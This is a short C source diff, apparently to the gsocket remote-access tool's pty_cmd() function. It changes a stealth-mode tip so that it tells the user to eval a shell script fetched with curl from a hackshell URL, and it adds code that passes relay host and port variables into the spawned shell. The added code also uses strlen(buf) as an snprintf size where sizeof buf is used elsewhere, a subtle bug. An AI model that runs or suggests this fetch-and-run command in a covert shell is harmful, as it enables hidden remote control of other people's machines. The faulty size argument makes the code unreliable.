@@ -1637,7 +1637,7 @@ pty_cmd(GS_CTX *ctx, const char *cmd, pid_t *pidptr, int *err)
 ", str);
 	if (gopt.flags & GSC_FL_IS_STEALTH) {
 		printf("\
-=Tip            : "CDC"source <(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)"CN"\n");
+=Tip            : "CDC"eval \"$(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)\""CN"\n");
 	}
 	if (GS_getenv("PS1") == NULL) {
 		// Note: This only works for /bin/sh because some bash reset this value.
@@ -1680,6 +1680,19 @@ pty_cmd(GS_CTX *ctx, const char *cmd, pid_t *pidptr, int *err)
 	// Cant use C.UTF-8 here because it screws up `systemctl status` output
 	envp[envplen++] = "LANG=en_US.UTF-8";
 	envp[envplen++] = "GS_CONFIG_READ=0";
+	// If server had HOST/PORT in ENV or config then pass these to the user's shell:
+	// Subsequent 'gsnc -s ...' shall go to the same gs-relay.
+	str = gopt.gs_host?:GS_GETENV2("HOST");
+	if (str) {
+		snprintf(buf, strlen(buf), "GS_HOST=%s", str);
+		envp[envplen++] = strdup(buf);
+	}
+	if ((gopt.gs_port <= 0) && (str = GS_GETENV2("PORT")))
+		gopt.gs_port = atoi(str);
+	if (gopt.gs_port > 0) {
+		snprintf(buf, sizeof buf, "GS_PORT=%d", gopt.gs_port);
+		envp[envplen++] = strdup(buf);
+	}
 
 	if (gopt.flags & GSC_FL_IS_STEALTH) {
 		if (gopt.flags & GSC_FL_SWD_SURVIVED_SIGTERM)
